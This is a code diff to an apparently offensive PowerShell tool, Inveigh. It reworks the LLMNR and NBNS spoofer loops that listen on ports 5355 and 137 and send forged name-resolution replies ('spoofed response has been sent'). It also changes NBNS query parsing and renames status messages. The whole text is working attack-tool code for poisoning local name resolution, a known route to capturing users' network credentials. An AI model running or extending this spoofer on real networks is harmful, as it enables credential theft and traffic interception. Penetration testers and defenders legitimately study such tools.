@@ -1105,13 +1105,14 @@ $LLMNR_spoofer_scriptblock =
 {
     param ($LLMNR_response_message,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$LLMNRTTL)
 
+    $LLMNR_listener_endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,5355)
+    $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
+    $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
+    $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
+    $LLMNR_UDP_client.Client.ReceiveTimeout = 10000
+
     while($inveigh.unprivileged_running)
     {
-        $LLMNR_listener_endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,5355)
-        $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
-        $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
-        $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
-        $LLMNR_UDP_client.Client.ReceiveTimeout = 10000
         $LLMNR_request_data = $LLMNR_UDP_client.Receive([Ref]$LLMNR_listener_endpoint)
         $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
         [Array]::Reverse($LLMNR_TTL_bytes)
@@ -1130,11 +1131,14 @@ $LLMNR_spoofer_scriptblock =
 
         if(($LLMNR_request_data -and $LLMNR_listener_endpoint.Address.IPAddressToString -ne '0.0.0.0') -and (!$SpooferHostsReply -or $SpooferHostsReply -contains $LLMNR_query_string) -and (!$SpooferHostsIgnore -or $SpooferHostsIgnore -notcontains $LLMNR_query_string) -and (!$SpooferIPsReply -or $SpooferIPsReply -contains $source_IP) -and (!$SpooferIPsIgnore -or $SpooferIPsIgnore -notcontains $source_IP) -and ($inveigh.spoofer_repeat -or $inveigh.IP_capture_list -notcontains $source_IP.IPAddressToString))
         {
-            #$LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient(0)
             $LLMNR_destination_endpoint = New-Object Net.IPEndpoint($LLMNR_listener_endpoint.Address,$LLMNR_listener_endpoint.Port)
             $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)
             $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
             $LLMNR_UDP_client.Close()
+            $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
+            $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
+            $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
+            $LLMNR_UDP_client.Client.ReceiveTimeout = 10000
             $LLMNR_response_message = "- spoofed response has been sent"
         }
         else
@@ -1179,11 +1183,12 @@ $NBNS_spoofer_scriptblock =
 {
     param ($NBNS_response_message,$SpooferIP,$NBNSTypes,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$NBNSTTL)
 
+    $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
+    $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
+    $NBNS_UDP_client.Client.ReceiveTimeout = 10000
+
     while($inveigh.unprivileged_running)
     {
-        $NBNS_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
-        $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
-        $NBNS_UDP_client.Client.ReceiveTimeout = 10000
         $NBNS_request_data =$NBNS_UDP_client.Receive([Ref]$NBNS_listener_endpoint)
         $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
         [Array]::Reverse($NBNS_TTL_bytes)
@@ -1240,15 +1245,11 @@ $NBNS_spoofer_scriptblock =
 
         }
 
-        $NBNS_query_string_encoded = $([Text.Encoding]::UTF8.GetString($NBNS_request_data))
-        $NBNS_query_string_encoded = $NBNS_query_string_encoded.SubString(13,($NBNS_query_string_encoded.Length - 16))
-        $NBNS_query_string_encoded = $NBNS_query_string_encoded -replace "00",""
-
-        if($NBNS_query_string_encoded -like '*CA*')
-        {
-            $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
-        }
-
+        $NBNS_query = [System.BitConverter]::ToString($NBNS_request_data[13..($NBNS_request_data.Length - 4)])
+        $NBNS_query = $NBNS_query -replace "-00",""
+        $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+        $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
+        $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
         $NBNS_query_string_subtracted = ""
         $NBNS_query_string = ""
         $n = 0
@@ -1279,6 +1280,8 @@ $NBNS_spoofer_scriptblock =
                 $NBNS_UDP_client.Connect($NBNS_destination_endpoint)
                 $NBNS_UDP_client.Send($NBNS_response_packet,$NBNS_response_packet.Length)
                 $NBNS_UDP_client.Close()
+                $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
+                $NBNS_UDP_client.Client.ReceiveTimeout = 10000
                 $NBNS_response_message = "- spoofed response has been sent"
             }
             else
@@ -1446,7 +1449,7 @@ $control_unprivileged_scriptblock =
                 if($inveigh.unprivileged_running)
                 {
                     HTTPListenerStop
-                    $inveigh.console_queue.Add("Inveigh Brute Force exited due to run time at $(Get-Date -format 's')")
+                    $inveigh.console_queue.Add("Inveigh Unprivileged exited due to run time at $(Get-Date -format 's')")
                     $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited due to run time")])
                     Start-Sleep -m 5
                     $inveigh.unprivileged_running = $false
@@ -1592,7 +1595,7 @@ function NBNSBruteForceSpoofer()
     $NBNS_bruteforce_spoofer_powershell.BeginInvoke() > $null
 }
 
-# Control Brute Force Startup function
+# Control Unprivileged Startup function
 function ControlUnprivilegedLoop()
 {
     $control_unprivileged_runspace = [RunspaceFactory]::CreateRunspace()
@@ -1882,7 +1885,7 @@ function Stop-Inveigh
                 $inveigh.HTTP_listener.server.Close()
                 Start-Sleep -s 1
                 $inveigh.HTTP_listener.Stop()
-                Write-Output("Inveigh Brute Force exited at $(Get-Date -format 's')")
+                Write-Output("Inveigh Unprivileged exited at $(Get-Date -format 's')")
                 $inveigh.log.Add("$(Get-Date -format 's') - Inveigh Unprivileged exited")  > $null
 
                 if($inveigh.file_output)
